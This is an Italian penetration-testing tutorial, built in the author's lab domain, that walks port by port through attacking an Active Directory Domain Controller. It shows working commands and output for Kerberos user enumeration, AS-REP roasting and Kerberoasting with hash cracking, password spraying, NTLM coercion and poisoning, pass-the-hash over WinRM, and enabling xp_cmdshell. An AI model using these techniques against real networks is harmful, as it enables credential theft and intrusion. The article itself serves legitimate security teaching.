
# Premessa
Questo articolo non vuole essere niente di complicato o di estremamente dettagliato sull'argomento. Il mio desiderio sarebbe quello di trasmettere interesse ed accendere curiosità in chi legge, lasciando la possibilità al lettore di approfondire ogni tema. 

## Porte

Nella maggioranza dei casi, un Domain Controller, ad un prima scansione, si presenta più o meno con le seguenti porte:

```bash
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5357/tcp  open  wsdapi
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49687/tcp open  unknown
49688/tcp open  unknown
49693/tcp open  unknown
49694/tcp open  unknown
49727/tcp open  unknown
```

Di queste, quelle di vitale importanza sono:
- 88 -> Kerberos
- 135 -> RPC
- 139 e 445 -> Netbios e SMB
- 389 e 636 -> LDAP/LDAPS
- 5985 -> WinRM
- 3389 -> RDP (Non presente in questo caso nel mio lab, ma sicuramente presente in ambienti reali)

Altre porte che potrebbero essere presenti su un Domain Controller potrebbero essere la 80 e 443 (qualora venga utilizzato come Certification Authority con Web Enrollment) e la porta 1433 (qualora ci fosse un SQL Server. Personalmente non mi è mai capitato e non sarebbe buona prassi se ci fosse).

## Kerberos - Porta 88

### Senza credenziali
Se non si hanno credenziali, la porta 88 non consente di fare molto, in linea di massima solo un'enumeration alla cieca tramite un bruteforce sui nomi. In che modo?

Kerberos possiede un database dei vari utenti del dominio e noi possiamo richiedere un ticket per conto di un utente generico. Quest'azione fallirà la maggior parte delle volte perchè Kerberos ovviamente impedisce che vengano chiesti ticket per conto di altri, tramite uno step di Pre-Authentication. 
E paradossalmente, questo ci agevola! Vediamo perchè.

Osserviamo cosa succede se noi tentiamo di richiedere un ticket per un utente che non esiste:

```bash
GetNPUsers.py ace.local/nonexistentuser -no-pass -dc-ip dc
Impacket v0.10.1.dev1+20220711.165137.65ff31d3 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for nonexistentuser
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
Ci viene detto a chiare lettere che l'utente per il quale abbiamo chiesto il ticket non esiste.

Proviamo invece a chiedere un ticket per un utente che siamo sicuri esista, Administrator:

```bash
GetNPUsers.py ace.local/Administrator -no-pass -dc-ip dc
Impacket v0.10.1.dev1+20220711.165137.65ff31d3 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Ci viene detto invece che l'utente Administrator non ha l'attributo "UF_DONT_REQUIRE_PREAUTH" settato.

Cosa vuol dire questo? Che noi possiamo quindi scoprire l'esistenza degli utenti eseguendo un bruteforce sul servizio di Kerberos.

Prepariamo un file contenente tutti i nomi che vogliamo provare:
```
Administrator
gianni
paolo
sara
marco
atom
lino
```

E lanciamo GetNPUsers.py:
```
GetNPUsers.py ace.local/ -usersfile users -no-pass -dc-ip dc
Impacket v0.10.1.dev1+20220711.165137.65ff31d3 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User atom doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Abbiamo scoperto che l'utente "atom" esiste!

Nota: Nella maggioranza dei casi, non capiterà in ambienti reali di riuscire a bruteforzare usando solo dei nomi, è invece ben più probabile che il dominio adotti una "Naming Convention" e che quindi gli username possano essere del tipo "mrossi" oppure "m.rossi" o anche "matteo.rossi".

### Con solo degli username - ASREPRoast
Se invece abbiamo già fatto enumeration o anche un po' di OSINT e abbiamo già dei nomi, possiamo provare a sperare che qualche utente abbia l'attributo "UF_DONT_REQUIRE_PREAUTH" settato e che quindi sia possibile chiedere un ticket per conto di quell'utente.

Per settare l'attributo è sufficiente, dal Domain Controller, andare su Server Manager -> Users and Computers -> Users -> utente target -> Properties -> Account -> Do Not Require Pre Authentication. Quindi Apply e Ok per confermare.
![](https://i.imgur.com/h7dXZej.png)

Fatto ciò, se riproviamo l'attacco precedente potremo ottenere un ticket per Atom ed incontreremo una nuova challenge, cioè quella di provare ad ottenere la password dell'utente crackando il ticket.

```
GetNPUsers.py ace.local/ -usersfile users -no-pass -dc-ip dc
Impacket v0.10.1.dev1+20220711.165137.65ff31d3 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$atom@ACE.LOCAL:5bb8fa2e85adc28956d77cdc606af213$f71baf76bc2f04f623a7cc96e71449ba5a2b3a1d81063c20c48fdfb1b77e57cc4918077c0df9b521b98bde57876046c8c5193988be2b6559080d881168eb68fa4ac76c1bfa7154f53303d8524bbd474cc8f12f0a879293b4e545ad5554b3ff029c99263a7cabc581480a49ae7d831ba381e14111c859c563cf73a41aa193ab3e104dc84a00e10b8a887b053a26b3286823f042b59a84654a2308e28af89afb52dcad2947873d78d956ac4786d741a7a8a037560c49225dfa5811c2603f0b559f701a5b9131b421e8f552f199c995f2820143f3f4d7c1ae2a666a37803c0a6639a97bdedeac52
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Scriviamo il ticket cifrato in un file e tentiamo di crackarlo con John:

```
john atom.hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password#        ($krb5asrep$23$atom@ACE.LOCAL)     
1g 0:00:00:04 DONE (2022-07-16 20:26) 0.2277g/s 3267Kp/s 3267Kc/s 3267KC/s !)(OPPQR..Password#
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Ci è andata bene, abbiamo ottenuto la password!

### Con credenziali

In realtà ottenute delle credenziali, con Kerberos il gioco è più o meno fatto. Possiamo utilizzarlo per chiedere dei TGT ed utilizzare quelli per autenticarci piuttosto che utilizzando hash NTLM o password.

### Bonus: password spray

Se abbiamo già ottenuto tutti gli utenti, possiamo utilizzare Kerberos come servizio alternativo ad SMB o LDAP (che potrebbero lockare gli account)  per fare un password spray con password semplici e poco complesse come ad esempio "NomeCompagnia2022!" o "Stagione2022!".
E' importante saper dosare il password spray sennò ci si ritrova a chiudere fuori gli utenti e quindi rallentare l'attività produttiva (sconsigliato il lunedì mattina).

## RPC - Porta 135

RPC sta per Remote Procedure Call ed è un endpoint molto importante di un Domain Controller. Tramite RPC è possibile autenticarsi presso delle Named Pipe esposte, ottenere usernames, enumerare il dominio e molto altro. Da quando Topotam ha rilasciato PetitPotam l'interesse verso RPC ed i vari metodi che esso supporta è cresciuto notevolmente nella comunità.
Per un penetration tester/red teamer, il ruolo principale di RPC è risiede nella possibilità, in determinate situazione, di riuscire a forzare un'autenticazione _dalla_ macchina verso di noi o verso un host a nostra discrezione. 
RPC può anche molto utile per eseguire enumerazione sulla macchina, ottenere gli utenti locali o di dominio, leggere le descrizioni degli stessi, ma anche aggiungere utenti a gruppi ed in questo caso il suo utilizzo è combinato con SMB.

### Senza credenziali
In linea generale, quando non si possiedono credenziali, su un Domain Controller ben patchato ed aggiornato, non si può fare molto. Una speranza potrebbe essere quella di utilizzare PetitPotam per tentare di triggerare un'autenticazione verso il nostro Responder.
Nel caso in cui dovesse funzionare già quella è una vulnerabilità da segnalare e potrebbe diventare un buon inizio per qualche attacco Relay.
Un'altra possibilità è quella che RPC (e anche SMB dunque) consentano accesso anonimo e dunque consentano di eseguire enumerazioni di utenti, gruppi, permessi, shares ed altro.


### Con credenziali
Il gioco cambia quando invece si posseggono delle credenziali che ci consentono di accedere a molti più endpoint e di ottenere quindi un'autenticazione verso di noi o verso un host a piacere.
Normalmente ottenere un'autenticazione serve a tentare degli attacchi Relay verso altri host (basti pensare a quanto venne fuori PetitPotam ed in combinazione fu scoperto ADCS, dove quindi senza credenziali era possibile diventare Domain Admin).
Se si è in possesso di credenziali, è possibile forzare un'autenticazione tramite:
- Dementor (Tramite endpoint MS-RPRN, consente il cosiddetto printerbug) https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py
- PetitPotam con credenziali https://github.com/topotam/PetitPotam
- Shadowcoerce (Tramite endpoint MS-FSRVP, il quale non è installato di default) https://github.com/ShutdownRepo/ShadowCoerce
- DFSCoerce (Tramite endpoint MS-DFSNM) https://github.com/Wh04m1001/DFSCoerce
- Coercer (che li sfrutta tutti quelli conosciuti in un colpo solo) https://github.com/p0dalirius/Coercer

Per quanto riguarda invece l'enumerazione, è possibile usare tools come "Enum4Linux" che fornisce una discreta panoramica. Un'altra alternativa potrebbe essere "lookupsid.py" che consente di enumerare gli utenti della macchina.

## NETBIOS - Porta 139

Netbios è un servizio classico per ogni macchina che abbia SMB installato e quindi per tutti le macchine Windows. La sua funzionalità è quella di risolvere i nomi macchine sulla rete mediante il protocollo NBT. 
In ambito penetration testing questo servizio può essere sfruttato tramite la tecnica del Poisoning.
Come?
Se il protocollo viene usato per la risoluzione di nomi all'interno di una rete, vuol dire che ogni computer si "presenta" sulla rete e dice chi è. 
Supponiamo quindi di avere 3 computer, A, B e C. Computer B deve mandare delle informazioni a computer C. C dice a tutte la rete chi è, in questo modo A e B possono comunicare con C.

Ma se A dicesse di essere C?

Ovviamente il contesto è molto semplificato in quanto, per la risoluzione di nomi in un dominio esistono anche mDNS, LLMNR, oltre che i record di DNS. 
NBT Poisoning sfrutta proprio la possibilità di rispondere a nomi fittizi. Questo si traduce nel seguente scenario:
Un utente che usa computer B vuole accedere ad una risorsa su computer C e nel tentare l'accesso commette un errore di battitura e scrive "CC".
Poichè non esiste nessun computer chiamato "CC", la macchina dell'utente non sa a chi mandare le informazioni e di conseguenza si rivolge alla rete. E' in questa occasione che un attacker eseguirà il Poisoning: il computer dell'attacker risponderà alla richiesta della macchina dell'utente fingendo di essere il "CC" richiesto. 
In questo modo l'utente, probabilmente non si accorgerà dell'errore di battitura commesso e proseguirà il suo processo di autenticazione di rete presso la macchina dell'attaccante, che riuscirà a carpire le credenziali (a volte anche in chiaro) della vittima.
Il tool preferito per questo tipo di attacchi è `Responder`.

## LDAP/LDAPS - Porta 389/636

LDAP (Lightweight Directory Access Protocol) è uno dei protocolli più importanti all'interno di un dominio Active Directory, utilizza la porta 389 (quando è in chiaro) e 636 quando invece è crittografata. Gestisce:

- Permessi e ACL (possibilità di ogni utente, gruppo, macchina di compiere determinate azioni)
- Appartenenza ai gruppi
- Proprietà di ogni singolo utente, macchina, gruppo

Contiene tutte le informazioni importanti di Active Directory ed è fondamentale da analizzare quando si eseguono dei penetration test. La cosa bella? L'accesso in lettura è garantito a qualunque utente autenticato, quindi basta essere muniti di credenziali per poter ottenere un grande quantitativo di info.

E' possibile eseguire query su LDAP tramite un gran numero di tool:
- Classico ldapsearch
- Bloodhound e Sharphound (il primo da Linux e il secondo da Windows) - occhio che non utilizza solo LDAP per eseguire le connessioni
- AdExplorer (da Windows)
- Windapsearch
- LdapDomaindump
(Davvero ce ne sono troppi)

Vediamo un semplice esempio da ldapsearch:

```
ldapsearch -x -H ldap://dc.ace.local -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=ace,DC=local
namingcontexts: CN=Configuration,DC=ace,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=ace,DC=local
namingcontexts: DC=DomainDnsZones,DC=ace,DC=local
namingcontexts: DC=ForestDnsZones,DC=ace,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
Con questa prima query, stiamo chiedendo innanzitutto quali sono i naming context ovvero il nome del dominio a cui fare le nostre domande. Questa operazione può essere eseguita senza credenziali.

A questo punto, con le nostre credenziali, possiamo quindi fare una query per ottenere tutto l'albero LDAP e tutte le informazioni.

```
ldapsearch -x -H ldap://dc.ace.local -D atom@ace.local -w Password# -b "DC=ace,DC=local"                                                                 
# extended LDIF                                                                                                                                                        
#                                                                                                                                                                      
# LDAPv3                                                                                                                                                               
# base <DC=ace,DC=local> with scope subtree                                                                                                                            
# filter: (objectclass=*)                                                                                                                                              
# requesting: ALL                                                                                                                                                      
#                                                                                                                                                                      
                                                                                                                                                                       
# ace.local                                                                                                                                                            
dn: DC=ace,DC=local                                                                                                                                                    
objectClass: top                                                                                                                                                       
objectClass: domain                                                                                                                                                    
objectClass: domainDNS                                                                                                                                                 
distinguishedName: DC=ace,DC=local                                                                                                                                     
instanceType: 5                                                                                                                                                        
whenCreated: 20220623143752.0Z                                                                                                                                         
whenChanged: 20220728135932.0Z                                                                                                                                         
subRefs: DC=ForestDnsZones,DC=ace,DC=local                                                                                                                             
subRefs: DC=DomainDnsZones,DC=ace,DC=local                                                                                                                             
subRefs: CN=Configuration,DC=ace,DC=local 
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAboyUVibqAk+3IT+Wt0g21A==
uSNChanged: 192560
name: ace
objectGUID:: naJuHYQwu0yrcjOW7hLRNA==
creationTime: 133034903724677075
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
[-----snip-----]
```
L'output sarà immenso in quanto stiamo chiedendo tutte le informazioni di tutto l'albero. Se volessimo informazioni precise possiamo usare i filtri LDAP che possiamo trovare qua: https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx

Un'altra validissima alternativa è quella di lanciare Bloodhound-python, che eseguirà numerose query LDAP per ottenere informazioni che poi ci mostrerà graficamente.

```
bloodhound-python -c all -u atom -p 'Password#' -d ace.local -dc dc.ace.local -ns 192.168.22.133 --dns-tcp 
INFO: Found AD domain: ace.local
INFO: Connecting to LDAP server: dc.ace.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: dc.ace.local
INFO: Found 8 users
INFO: Found 52 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: server.ace.local
INFO: Querying computer: client.ace.local
INFO: Querying computer: CA.ace.local
INFO: Querying computer: dc.ace.local
INFO: Done in 00M 01S
```

Un'operazione del genere non è particolarmente Stealth, in quanto stiamo chiedendo a Bloodhound di collezionare tutti i dati possibili dal Domain Controller, ma fornisce una grande panoramica sulla situazione del dominio per ogni utente, gruppo e macchina. E' sempre assolutamente raccomandato lanciarlo durante un penetration test.

LDAP consente inoltre anche di reperire informazioni sulle Delegation e sugli SPNs (Service Principal Name), che vengono usati nel dominio per effettuare l'impersonazione, ovvero la possibilità per un determinato servizio, di compiere azioni per conto di un utente.

Per "costruzione" gli utenti con SPN, sono soggetti ad un attacco chiamato "Kerberoast". Questo attacco sfrutta in combinazione LDAP e Kerberos per richiedere un ticket (cifrato). L'operazione è molto simile a quanto visto poco più in alto. Ottenuto questo ticket cifrato, si può tentare di crackarlo.

Nella fortunata casistica in cui si riuscisse a crackare il ticket ed ottenere la password, essendo una credenziale di un utente di servizio _abilitato per svolgere operazioni per conto di altri utenti (delegation)_ sarà quindi possibile impersonare qualunque utente su quel servizio specifico.

Vediamolo con un esempio:

```
GetUserSPNs.py ace.local/atom:Password# -dc-ip dc.ace.local
Impacket v0.10.1.dev1+20220711.165137.65ff31d3 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                Name     MemberOf                                               PasswordLastSet             LastLogon                   Delegation 
----------------------------------  -------  -----------------------------------------------------  --------------------------  --------------------------  ----------
mssqlservice/server.ace.local:1434  sqlserv                                                         2022-07-24 20:09:12.199552  2022-07-29 16:56:13.766526           
```

In questo caso abbiamo che l'utente `sqlserv` ha un SPN `mssqlservice/server.ace.local:1434`. Possiamo quindi richiedere un ticket lanciando lo stesso comando ed aggiundendo, alla fine `-request`.
Ottenuto il ticket e svolte le stesse operazioni descritte precedentemente per l'ASREPRoast, se riusciamo ad ottenere la password possiamo finalmente impersonare qualunque utente per quello specifico servizio (in questo caso SQLServer) utlizzando il cosidetto "Silver Ticket".

Tramite LDAP è possibile anche eseguire delle modifiche dei permessi (se l'utente che abbiamo compromesso possiede i giusti requisiti) come descritto qui:
https://www.thehacker.recipes/ad/movement/dacl

(Non sono sceso nel dettaglio in quanto LDAP è un argomento enorme e non è l'obiettivo di questa panoramica affrontare questi temi nel profondo)

## SMB - Porta 445 
SMB è il servizio tipico di tutti i computer Windows (ed anche una gran fonte di vulnerabilità), serve a scambiare dati, a fare comunicare diversi pc in una rete tra di loro ma anche con altri componenti tipo le stampanti. Non è infatti raro imbattersi in stampanti che eseguono delle scansioni e poi tramite SMB le mandano a dei NAS della rete per lo storage dei vari documenti.
Se ben configurato, SMB non può essere acceduto in maniera anonima ovvero senza credenziali, ma talvolta, o per superficialità, o per negligenza o per ambienti obsoleti e mai più modificati (perchè se funziona, meglio non toccare niente sennò chissà che succede!!!) può capitare di avere questa opportunità.

Esiste un grande numero di tool per effettuare collegamenti ad un SMB come ad esempio:
- smbclient (nativo di Linux)
- smbclient.py (impacket)
- smbmap 
- crackmapexec

E molti altri.

### Senza credenziali
Se non si posseggono credenziali, normalmente non c'è molto che si possa provare eccetto un banale fingerprint (che può essere abbastanza utile per riconoscere le versioni dei sistemi operativi nella rete) oppure provare ad autenticarsi con la cosiddetta "null session".

Per tentare di autenticarci senza credenziali possiamo provare quanto segue:
```
smbclient -L \\\\192.168.22.133\\ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.22.133 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

(Il -L serve a chiedere di listare le varie share presenti, mentre il -N serve a chiedere una null session).

Se invece volessimo eseguire un rapido check sui pc all'interno della rete, possiamo usare CrackMapExec il quale ci dirà anche che grado di accesso abbiamo sulle varie share SMB di ogni host nella rete ed in più farà un rapido fingerprint dei sistemi operativi, dei nomi macchina e degli indirizzi IP. Può essere molto utile per individuare rapidamente "prede" facili come sistemi obsoleti (Windows 2003 ho avuto il piacere/dispiacere di vederne tanti).
```
crackmapexec smb 192.168.22.0/24
SMB         192.168.22.133  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ace.local) (signing:True) (SMBv1:False)
SMB         192.168.22.131  445    SERVER           [*] Windows 10.0 Build 17763 x64 (name:SERVER) (domain:ace.local) (signing:False) (SMBv1:False)

```

E sottinteso che, laddove sia consentito un accesso senza credenziali, le possibili operazioni possono essere di sola lettura e quindi possibilità di esfiltrazione di dati o di acquisizione di maggiori informazioni, oppure di lettura e scrittura, che rende quindi realizzabili attacchi che sfruttano la componente umana.
Ad esempio, se troviamo una share aperta in scrittura e la share si chiama "Docs" o "documenti", potremmo provare ad inserirvi dei documenti malevoli, in modo tale che se qualche utente incuriosito, decida di aprirli, noi possiamo avere una shell sulla sua macchina (o magari triggerare una connessione ed ottenere il suo hash Net-NTLMv2/v1).

### Con credenziali

Chiaramente, con credenziali il discorso diventa molto più semplice. Per ogni macchina nel dominio Domain Controller incluso, si ha quasi sempre accesso almeno in lettura. La mole di informazioni che si può ricavare è elevatissima a questo punto. Inoltre, avere credenziali  a volte può anche garantire la possibilità di essere local admin su una o più macchine. Questo perchè sebbene l'utente di cui noi possediamo le credenziali sia un normale utente di dominio, molto spesso gli utenti sono configurati per essere amministratori del proprio computer e, occasionalmente, anche amministratori verso altri server condivisi (per quanto questa possa essere una bad practice è comunque estremamente diffusa).

```
crackmapexec smb 192.168.22.0/24 -u levi -p Password#
SMB         192.168.22.131  445    SERVER           [*] Windows 10.0 Build 17763 x64 (name:SERVER) (domain:ace.local) (signing:False) (SMBv1:False)
SMB         192.168.22.131  445    SERVER           [+] ace.local\levi:Password# (Pwn3d!)
SMB         192.168.22.133  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ace.local) (signing:True) (SMBv1:False)
SMB         192.168.22.133  445    DC               [+] ace.local\levi:Password#
```
Per esempio in questa occasione, l'utente "levi" non è Domain Admin ma è amminsitratore locale sulla macchina "server". Questo vuol dire che possiamo fare _qualunque_ cosa su quella macchina. Come ad esempio dumpare credenziali dalla macchina mediante dump di LSASS, SAM, hashes, tokens e tickets e quindi o fare escalation sul dominio oppure muoverci lateralmente sullo stesso. Ma possiamo anche ottenere una shell sulla macchina stessa mediante `psexec.py`/`wmiexec.py`/`smbexec.py`, oppure creare nuovi utenti amministratori locali (per PoC o persistenze) o utilizzare la macchina come Pivot point per manipolare il traffico di rete o ancora per eseguire attacchi Relay nel dominio.

## RDP - Porta 3389

RDP (Remote Desktop Protocol) viene utilizzato per effettuare una connessione con Desktop Remoto ad un computer. Normalmente è quasi sempre abilitata ma non è accessibile da chiunque. Infatti, come per WinRM, è necessario fare parte di gruppi specifici (Remote Desktop Users/Print Operators) o avere privilegi amministrativi per poter utilizzare RDP. Per un attaccante, RDP è un'ottima opportunità in quanto, essendo un servizio legittimo, avendo un set di credenziali valide è possibile utilizzarle per effettuare un Login presso il computer scelto.

Normalmente sui server questa operazione è sempre consentita in quanto supportano multi-user RDP, cioè che più utenti diversi, possono collegarsi insieme sullo stesso server. Multi-user non è invece abilitato sui client, quindi se c'è già un utente attivo sulla macchina, per poterci loggare noi dovremo far sloggare lui, e di conseguenza, in ambito Penetration Test è davvero l'ultima opzione da tenere in considerazione in quanto causa problemi a chi lavora.

In ogni caso però, un Desktop Remoto è sicuramente molto più utile di solo un terminale quando si lavora con Windows, in quanto, familiarità a parte, non si va incontro a numerevoli restrizioni che un terminale impone (incluso WinRM).

Se volessimo andare in RDP su un server da Windows, possiamo banalmente fare riferimento a mstsc.exe.

Se invece volessimo farlo da Linux avremmo numerose alternative tra cui xfreerdp, rdesktop o anche remmina.

## WinRM - Porta 5985

WinRM (Windows Remote Management) è un servizio che è normalmente disabilitato di default sulle macchine client e abilitato sui server e sui Domain Controllers. Viene molto spesso utilizzato dagli amministratori del dominio per eseguire rapidamente operazioni su altri computer.
Lo scopo infatti di questo protocollo è quello di fornire Amministrazione Remota, ideale per eseguire script in bulk su diversi computer, oppure per risolvere rapidamente un problema sul pc di un utente.
Di norma, gli utenti del dominio non posso usare WinRM per collegarsi ai computer, eccezione fatta per coloro che si trovano nel gruppo "Remote Management Users" o in italiano "Utenti gestione remota" e per coloro che sono Amministratori (locali o del dominio) o che fanno parte del gruppo di dominio "Print Operators".

Poichè WinRM è un servizio assolutamente lecito da utilizzare, può essere molto utile approfittarne qualora si volesse mantenere un profilo basso, per cui, avendo accesso a questo servizio, possiamo ottenere una shell ed enumerare la macchina dall'interno.

Chiaramente, per poterne fare uso è necessario possedere un set valido di credenziali.

Se volessimo utilizzare Linux per accedere alla porta 5985 di un server, potremmo utilizzare "Evil-WinRM" con il seguente comando:

`evil-winrm -i <target> -u <user> -p <password` 
Una particolarità interessante di Evil-WinRM è che consente anche, qualora non si fosse in possesso di una password in chiaro, ma bensì di un hash NTLM, di accedere utilizzando l'hash

`evil-winrm -i <target> -u <user> -H <hash>`

Se invece volessimo approfittare di WinRM da Windows, dovremo eseguire quanto segue:

```
$pass = ConvertTo-SecureString -AsPlainText -Force "<password>"
$cred = New-Object System.Management.Automation.PSCredentials("<domain>\<username>",$pass)
Enter-PSSession -computer <target> -Credential $cred
```
Cosa abbiamo fatto?
Con il primo comando abbiamo convertito la password in chiaro ad una "Secure String" e la abbiamo salvata in una variabile ($pass), step necessario in quanto una credenziale in chiaro non è usabile.
Con il secondo abbiamo creato un oggetto di tipo Credenziale, costruito a partire dal nostro username (compreso il dominio) e dalla Secure String che abbiamo salvato nella variabile.
Infine, come ultimo step, siamo entrati in una PSSession, ovvero abbiamo eseguito una connessione verso il computer target e l'abbiamo fatto passando come credenziali quelle appena create.

## Extra MSSQL - Porta 1433

Microsoft SQL Server è il database più diffuso su sistemi Windows, anche per la grande facilità di installazione ed integrazione all'interno di un dominio di Active Directory. Sebbene la porta 1433 su un Domain Controller si veda aperta di rado, può comunque capitare di incontrare un DC che ha anche un database.

Solitamente, senza credenziali è possibile solo fare un fingerprint banale con nmap o altri scanner.

Quando si hanno credenziali invece, la situazione può diventare più interessante.
Innanzitutto occorre specificare che non sempre le credenziali di utenti del dominio possono funzionare, spesso invece, se configurato per accettare connessioni dal dominio, il database, fornirà un livello d'accesso guest.

L'utente più importante di SQL Server è solitamente "sa" che sta per SuperAdmin. Questo account è potentissimo in quanto consente non solo di avere pieno accesso al database, ma anche di eseguire comandi a sistema operativo, e quindi di ottenere reverse shells.

Come si accede ad un SQL Server?
Se siamo su Windows possiamo utilizzare `sqlcmd` mentre se siamo su Linux, l'opzione in assoluto più consigliata è quella di utilizzare `mssqlclient.py`. Ulteriori alternative possono essere programmi come `HeidiSQL`.

### Credenziali low priv
Con credenziali low priv solitamente si possono fare un po' di query sul database ed enumerare ulteriori utenti, o qualche permesso, o la presenza di "Stored Procedures" che potrebbero agevolare i nostri tentativi di exploiting.
Generalmente l'accesso al SQLServer non viene consentito agli utenti del dominio, piuttosto si tende a creare un'utenza specifica, con SPN (Service Principal Name) che consenta impersonation per svolgere le varie operazioni sul database per conto degli altri utenti.

Oltre ad una banale enumeration, un utente avente privilegi non elevati, può usufruire della Stored Procedure chiamata "xp_dirtree" per leggere files presenti sulla macchina, oppure, ben più interessante, per ottenere un'autenticazione SMB verso sè stessi, andando quindi a ricevere l'hash Net-NTLMv2/v1 della macchina o dell'utente nel cui contesto gira il database.

Ottenere l'hash potrebbe consentire di crackarlo ed ottenere la password dell'utente, o eventualmente di eseguire un attacco Relay all'interno della rete.

Qualora si riuscisse ad ottenere le credenziali dell'utente con SPN, allora sarebbe possibile impersonare l'amministratore del dominio sul database ed avere quindi accesso alle stored procedures che consentono di eseguire comandi a sistema operativo.

### Credenziali High priv

Supponendo che abbiamo ottenuto un accesso amministrativo, o mediante impersonation o mediante credenziali, a questo punto abbiamo la possibilità di utilizzare "xp_cmdshell", che consente di eseguire comandi a sistema operativo.

Per fare ciò, è necessario innanzitutto abilitarla. E per farlo serve avere il ruolo di "sysadmin" nel database.

Se per accedere abbiamo usato mssqlclient.py, è già presente un comando per abilitarla "enable_xp_cmdshell", mentre nel caso in cui avessimo avuto accesso da Windows (o tramite una SQLinjection) dovremo lanciare quanto segue:

```
EXECUTE sp_configure 'show advanced options', 1;  
GO  
RECONFIGURE;  
GO  
EXECUTE sp_configure 'xp_cmdshell', 1;  
GO  
RECONFIGURE;  
GO  
```

Quindi, finalmente, possiamo lanciare `"xp_cmdshell '<comando>'"` per eseguire un comando a sistema operativo.

*Geiseric*
